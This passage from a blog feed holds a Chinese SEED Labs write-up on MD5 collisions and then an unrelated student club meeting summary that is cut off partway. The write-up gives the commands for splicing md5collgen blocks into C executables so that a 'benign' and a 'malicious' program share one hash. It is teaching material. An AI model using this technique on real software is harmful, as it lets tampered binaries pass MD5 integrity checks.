src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20260105210617452.png" alt="image-20260105204808620"></p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20260105210617493.png" alt="image-20260105204822707"></p><blockquote><p><strong>Question 1</strong> If the length of your prefix file is not multiple of 64, what is going to happen?</p></blockquote><p>补零至 64 Byte。</p><blockquote><p><strong>Question 2</strong> Create a prefix file with exactly 64 bytes, and run the collision tool again, and see what happens.</p></blockquote><p>将 prefix.txt 改为</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijk</span></span><br></pre></td></tr></table></figure><p>这里一共 63 个字母，加上文件结束符 <code>0A</code> 正好 64 Byte。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5collgen -<span class="selector-tag">p</span> prefix<span class="selector-class">.txt</span> -o out1<span class="selector-class">.bin</span> out2.bin</span><br></pre></td></tr></table></figure><p>生成文件后如下所示</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20260105210617530.png" alt="image-20260105205007469"></p><p>可以看到没有补零了。</p><blockquote><p><strong>Question 3</strong> Are the data (128 bytes) generated by md5collgen completely different for the two output files? Please identify all the bytes that are different.</p></blockquote><p>例如第一个例子中，有 3 个 Byte 不同。经过多次尝试发现，这些不同的数量和位置不固定。</p><h2 id="Task-2-Understanding-MD5’s-Property">Task 2: Understanding MD5’s Property</h2><p>我们对刚刚的两个 md5 相同的文件分别加上一个后缀，然后查看它们的 md5</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20260105210617589.png" alt="image-20260105205153515"></p><p>可以看到，md5 相同的文件加上相同后缀后，md5 依然相同。</p><h2 id="Task-3-Generating-Two-Executable-Files-with-the-Same-MD5-Hash">Task 3: Generating Two Executable Files with the Same MD5 Hash</h2><p>新建 pro.c</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> pro.c</span><br></pre></td></tr></table></figure><p>修改内容如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> xyz[<span class="number">200</span>] = &#123;</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">200</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%x&quot;</span>, xyz[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o <span class="keyword">pro</span> <span class="keyword">pro</span>.c</span><br></pre></td></tr></table></figure><p>定位到刚刚的字符串存储在 <code>0x3020</code> 位置</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20260105210617663.png" alt="image-20260105205335396"></p><p>我们不妨截取到 <code>12340</code> 位置</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">head -<span class="keyword">c</span> <span class="number">12340</span> pro &gt; <span class="keyword">prefix</span></span><br></pre></td></tr></table></figure><p>计算得到在 <code>12320</code> 到 <code>12379</code> 范围内，<code>12352</code> 为 64 的倍数，因此我们把 <code>12352</code> 后面的截取出来</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">tail</span> -<span class="keyword">c</span> <span class="number">+12353</span> pro &gt; suffix</span><br></pre></td></tr></table></figure><p>然后对 prefix 生成 md5 相同的两个文件</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md<span class="number">5</span>collgen -p <span class="keyword">prefix</span> -o <span class="keyword">prefix</span><span class="number">1</span> <span class="keyword">prefix</span><span class="number">2</span></span><br></pre></td></tr></table></figure><p>把刚刚的尾巴接到这两个文件后面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> suffix &gt;&gt; prefix1</span><br><span class="line"><span class="built_in">cat</span> suffix &gt;&gt; prefix2</span><br></pre></td></tr></table></figure><p>赋予执行权限</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +<span class="keyword">x</span> <span class="keyword">prefix</span><span class="number">1</span></span><br><span class="line">chmod +<span class="keyword">x</span> <span class="keyword">prefix</span><span class="number">2</span></span><br></pre></td></tr></table></figure><p>运行</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ./<span class="keyword">prefix</span><span class="number">1</span></span><br><span class="line"><span class="number">42414141414141414141414141414141414141410000000000007</span>bcbaddb<span class="number">68638</span><span class="keyword">c</span><span class="number">84258</span><span class="keyword">c</span><span class="number">8</span>ef<span class="number">6</span>a<span class="number">826</span>ba<span class="number">28</span>bb<span class="number">3043</span>f<span class="number">4</span><span class="keyword">c</span><span class="number">3223389537e82</span>eed<span class="number">39493</span>d<span class="number">024</span>cca<span class="number">58</span>cd<span class="number">448</span><span class="keyword">c</span><span class="number">98</span>cb<span class="number">4</span>d<span class="number">45</span>f<span class="number">2</span>f<span class="number">8317e397</span>a<span class="number">6932</span>ddbeb<span class="number">95</span>a<span class="number">39</span>f<span class="number">88</span>f<span class="number">4</span>alf<span class="number">1</span>d<span class="number">213</span>f<span class="number">644</span>f<span class="number">65e270</span>d<span class="number">9</span>af<span class="number">707356328</span>d<span class="number">83</span>a<span class="number">23</span>a<span class="number">3</span>d<span class="number">0</span><span class="keyword">cc</span><span class="number">6e222</span>d<span class="number">25</span>fb<span class="number">74</span>bc<span class="number">0474</span>fc<span class="number">6</span>fc<span class="number">164</span>ecc<span class="number">02</span>d<span class="number">94</span>b<span class="number">08</span>afea<span class="number">8</span><span class="keyword">c</span><span class="number">3</span>eff<span class="number">85</span>cb<span class="number">688</span>be<span class="number">94</span><span class="keyword">c</span><span class="number">1711</span><span class="keyword">c</span><span class="number">8</span>f<span class="number">50592925e9</span>fd<span class="number">76e128</span>bb<span class="number">41414141414141414141414141414141414141414141414141414142000000000000</span></span><br><span class="line">$ ./<span class="keyword">prefix</span><span class="number">2</span></span><br><span class="line"><span class="number">42414141414141414141414141414141414141410000000000007</span>bcbaddb<span class="number">68638</span><span class="keyword">c</span><span class="number">84258</span><span class="keyword">c</span><span class="number">8</span>ef<span class="number">6</span>a<span class="number">826</span>ba<span class="number">28</span>bb<span class="number">304374</span><span class="keyword">c</span><span class="number">3223389537e82</span>eed<span class="number">39493</span>d<span class="number">024</span>cca<span class="number">58</span>cd<span class="number">448</span><span class="keyword">c</span><span class="number">98</span>cb<span class="number">4</span>d<span class="number">45</span>f<span class="number">2</span>f<span class="number">8</span>b<span class="number">17e397</span>a<span class="number">6932</span>ddbeb<span class="number">95</span>a<span class="number">39</span>f<span class="number">88</span>f<span class="number">421</span>f<span class="number">1</span>d<span class="number">213</span>f<span class="number">644</span>f<span class="number">65e270</span>d<span class="number">9</span>af<span class="number">707356328</span>d<span class="number">83</span>a<span class="number">23</span>a<span class="number">3</span>d<span class="number">0</span>ccee<span class="number">222</span>d<span class="number">25</span>fb<span class="number">74</span>bc<span class="number">0474</span>fc<span class="number">6</span>fc<span class="number">164</span>ecc<span class="number">02</span>d<span class="number">94</span>b<span class="number">08</span>afea<span class="number">8</span><span class="keyword">c</span><span class="number">3</span>eff<span class="number">85</span><span class="keyword">c</span><span class="number">3688</span>be<span class="number">94</span><span class="keyword">c</span><span class="number">1711</span><span class="keyword">c</span><span class="number">8</span>f<span class="number">50592925e97</span>d<span class="number">76e128</span>bb<span class="number">41414141414141414141414141414141414141414141414141414142000000000000</span></span><br></pre></td></tr></table></figure><p>可以看到，两个输出是不同的</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20260105210617721.png" alt="image-20260105205652102"></p><h2 id="Task-4-Making-the-Two-Programs-Behave-Differently">Task 4: Making the Two Programs Behave Differently</h2><p>构造 <code>origin.c</code> 如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> a[<span class="number">200</span>] = &#123;</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> b[<span class="number">200</span>] = &#123;</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> isSame=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">200</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i]!=b[i])</span><br><span class="line">            isSame=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(isSame)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;run benign code\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;run malicious code\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o <span class="built_in">origin</span> <span class="built_in">origin</span>.c</span><br></pre></td></tr></table></figure><p>找到两个数组位置</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20260105210617776.png" alt="image-20260105205817911"></p><p>与上一个 task 同样的方法，我们构造两个 md5 相同的文件</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">head -<span class="keyword">c</span> <span class="number">12340</span> origin &gt; <span class="keyword">prefix</span></span><br><span class="line">md<span class="number">5</span>collgen -p <span class="keyword">prefix</span> -o <span class="keyword">prefix</span><span class="number">1</span> <span class="keyword">prefix</span><span class="number">2</span></span><br></pre></td></tr></table></figure><p>查看 <code>prefix1</code></p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20260105210617821.png" alt="image-20260105205955078"></p><p>截取</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">tail</span> -c +12320 prefix1 &gt; middle <span class="comment"># 截取生成的字符串</span></span><br><span class="line"><span class="built_in">tail</span> -c +12768 origin &gt; suffix <span class="comment"># 截取第二个字符串（不含）后面的内容</span></span><br><span class="line"><span class="built_in">head</span> -c 12543 origin &gt; tmp1 <span class="comment"># 截取第二个字符串（不含）前面的内容</span></span><br><span class="line"><span class="built_in">tail</span> -c 63 tmp1 &gt; tmp <span class="comment"># 截取到需要填充的 0x00</span></span><br><span class="line"><span class="built_in">cat</span> tmp &gt;&gt; prefix1</span><br><span class="line"><span class="built_in">cat</span> tmp &gt;&gt; prefix2</span><br><span class="line"><span class="built_in">cat</span> middle &gt;&gt; prefix1</span><br><span class="line"><span class="built_in">cat</span> middle &gt;&gt; prefix2</span><br><span class="line"><span class="built_in">cat</span> tmp &gt;&gt; prefix1</span><br><span class="line"><span class="built_in">cat</span> tmp &gt;&gt; prefix2</span><br><span class="line"><span class="built_in">cat</span> suffix &gt;&gt; prefix1</span><br><span class="line"><span class="built_in">cat</span> suffix &gt;&gt; prefix2</span><br><span class="line"><span class="built_in">chmod</span> +x prefix1</span><br><span class="line"><span class="built_in">chmod</span> +x prefix2</span><br></pre></td></tr></table></figure><p>分别运行并检查 md5</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ ./<span class="keyword">prefix</span><span class="number">1</span></span><br><span class="line">run benign code</span><br><span class="line">$ ./<span class="keyword">prefix</span><span class="number">2</span></span><br><span class="line">run malicious code</span><br><span class="line">$ md<span class="number">5</span>sum <span class="keyword">prefix</span><span class="number">1</span> <span class="keyword">prefix</span><span class="number">2</span></span><br><span class="line"><span class="number">82</span>d<span class="number">3</span>b<span class="number">9</span>f<span class="number">2e3110</span>eeb<span class="number">62</span>d<span class="number">5</span>a<span class="number">029</span>acef<span class="number">283</span><span class="keyword">c</span> <span class="keyword">prefix</span><span class="number">1</span></span><br><span class="line"><span class="number">82</span>d<span class="number">3</span>b<span class="number">9</span>f<span class="number">2e3110</span>eeb<span class="number">62</span>d<span class="number">5</span>a<span class="number">029</span>acef<span class="number">283</span><span class="keyword">c</span> <span class="keyword">prefix</span><span class="number">2</span></span><br></pre></td></tr></table></figure><p>可以看到，它们运行了不同的代码，但 md5 是相同的。</p><h2 id="实验总结">实验总结</h2><p>前面 3 个 Task 非常简单。最后一个接来接去的不搞乱了、把该截取多少个想清楚了，就做出来了。</p>]]></content>
      
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Seed-Labs </tag>
            
            <tag> Cryptography </tag>
            
            <tag> Hash </tag>
            
            <tag> MD5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【致远分社】2025-2026秋季学期第四次例会</title>
      <link href="/posts/3f8c2a1d.html"/>
      <url>/posts/3f8c2a1d.html</url>
      
        <content type="html"><![CDATA[<h1 id="【致远分社】2025-2026秋季学期第四次例会"><a href="#【致远分社】2025-2026秋季学期第四次例会" class="headerlink" title="【致远分社】2025-2026秋季学期第四次例会"></a>【致远分社】2025-2026秋季学期第四次例会</h1><p><strong>活动时间</strong> | 2026.1.3<br><strong>活动地点</strong> | 12舍活动室</p><hr><h2 id="📌-活动概述"><a href="#📌-活动概述" class="headerlink" title="📌 活动概述"></a>📌 活动概述</h2><p>致远分社本学期最后一次例会。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20260105131325078.jpeg" alt="QQ图片20260105124711(78)"></p><hr><h2 id="📚-第一部分：重要通知与指导"><a href="#📚-第一部分：重要通知与指导" class="headerlink" title="📚 第一部分：重要通知与指导"></a>📚 第一部分：重要通知与指导</h2><h3 id="🎓-选课相关"><a href="#🎓-选课相关" class="headerlink" title="🎓 选课相关"></a>🎓 选课相关</h3><p><strong>三大核心提醒：</strong></p><ol><li><strong>下周正式选课来临</strong> — 预选筛选期间可以超出名额，正式选课时直接抢课，抢不到就遗憾了。</li><li><strong>开学第三周的黄金退选窗口</strong> — 有不喜欢的课程可以退掉，想补选遗漏的课程也来得及。</li><li><strong>天气降温提醒</strong> — 最近天气冷，大家记得添衣，保护好自己，别让感冒毁掉期末发挥。</li></ol><p><strong>选课小贴士：</strong></p><ul><li>📖 <strong>必看培养方案</strong> — 这是选课的黄金指南，能清楚地展示你还缺哪些课程</li><li>🔍 <strong>查阅课程评价</strong> — 可以在川大选课通、陈一一的自留地等平台查看往届学生对课程和教师的评价</li><li>🌟 <strong>避开”大热门”</strong> — 热门课程一票难求，不妨选择文新、历史学院等学院的相对”水”一点的课程</li><li>⚠️ <strong>谨慎对待必修课</strong> — 除非老师确实”差劲”，否则退了会很麻烦，到时候可能抢不到更好的</li></ul><hr><h2 id="🏆-第二部分：学科与竞赛经验分享"><a href="#🏆-第二部分：学科与竞赛经验分享" class="headerlink" title="🏆 第二部分：学科与竞赛经验分享"></a>🏆 第二部分：学科与竞赛经验分享</h2><h3 id="大创药剂实验室（理工科向）"><a href="#大创药剂实验室（理工科向）" class="headerlink" title="大创药剂实验室（理工科向）"></a>大创药剂实验室（理工科向）</h3><p>学长经验谈：</p><ul><li>如果有导师，直接联系导师讨论大创项目</li><li>没有导师？登上学院官网找感兴趣的教授，发邮件礼貌询问</li><li>教授通常会告诉你是否需要进实验室或找人学习</li></ul><p><strong>黄金法则</strong>：邮件要礼貌，内容要诚恳，热情会打动教授的心！</p><h3 id="全国大学生电子商务创新创意创业挑战赛（三创赛）"><a href="#全国大学生电子商务创新创意创业挑战赛（三创赛）" class="headerlink" title="全国大学生电子商务创新创意创业挑战赛（三创赛）"></a>全国大学生电子商务创新创意创业挑战赛（三创赛）</h3><p>📅 <strong>重要时间节点：</strong></p><ul><li>报名截止：已截止（今年10月20日-12月31日）</li><li>校赛时间：2026年3月11日-4月10日</li></ul><p>🎯 <strong>赛事分类：</strong></p><ul><li><strong>常规赛</strong> — 撰写策划书，包括三农、工业、跨境、物流等多个赛道</li><li><strong>实战赛</strong> — 需要找到合作企业，将方案真实落地，难度略高但含金量足</li></ul><p><strong>温馨提示</strong>：详细资料会发到群里，大家可以自行研究~</p><h3 id="大英赛（全国大学生英语竞赛）"><a href="#大英赛（全国大学生英语竞赛）" class="headerlink" title="大英赛（全国大学生英语竞赛）"></a>大英赛（全国大学生英语竞赛）</h3><p>💡 <strong>基本信息：</strong></p><ul><li>报名费：约50元</li><li>分为英语专业赛道和非英语专业赛道</li><li>需要认真备考才有望获得名次</li></ul><p>📝 <strong>复习建议</strong>：</p><ul><li>小红书搜索复习方法和经验</li><li>向往届学长学姐请教题目和资料</li><li>这是一项含金量不错的竞赛</li></ul><hr><h2 id="📖-第三部分：期末复习秘籍大公开"><a href="#📖-第三部分：期末复习秘籍大公开" class="headerlink" title="📖 第三部分：期末复习秘籍大公开"></a>📖 第三部分：期末复习秘籍大公开</h2><h3 id="🧪-理工科复习法（自行车学长分享）"><a href="#🧪-理工科复习法（自行车学长分享）" class="headerlink" title="🧪 理工科复习法（自行车学长分享）"></a>🧪 理工科复习法（自行车学长分享）</h3><p><strong>三步走战略：</strong></p><ol><li><strong>遇到不懂？上驿站或慕课</strong> — 看视频讲解，90%的问题都能解决</li><li><strong>视频也看不懂？开始刷题</strong> — 买上几本题集，就算不全会也能靠刷题找手感</li><li><strong>最后冲刺</strong> — 再做几套题熟悉题型，考试时基本没问题</li></ol><p><strong>额外建议</strong>：不会的东西可以QQ问老师，充分利用自学资源（B站、慕课等），有时候自学的效果反而更好！</p><h3 id="💊-医学专业复习法（硕洋学姐分享）"><a href="#💊-医学专业复习法（硕洋学姐分享）" class="headerlink" title="💊 医学专业复习法（硕洋学姐分享）"></a>💊 医学专业复习法（硕洋学姐分享）</h3><p><strong>两大课程类型，两种策略：</strong></p><p><strong>原理型课程</strong>（如药理学）：</p><ul><li>平时有不懂的，立即听网课</li><li>期末复习继续听高质量网课（B站、慕课是你的朋友）</li></ul><p><strong>记忆型课程</strong>（如系统解剖）：</p><ul><li>整本书基本都是重点，无法简单框选</li><li><strong>秘诀来了</strong> ⭐：老师最后一堂课会”从头捋一遍”，这就是在画重点！</li><li>强烈建议：<strong>录音 → 自己整理 → 重点复习</strong></li><li>提前在课本找到相关内容，重点背诵即可</li></ul><h3 id="📚-文科复习法（电吉他分享）"><a href="#📚-文科复习法（电吉他分享）" class="headerlink" title="📚 文科复习法（电吉他分享）"></a>📚 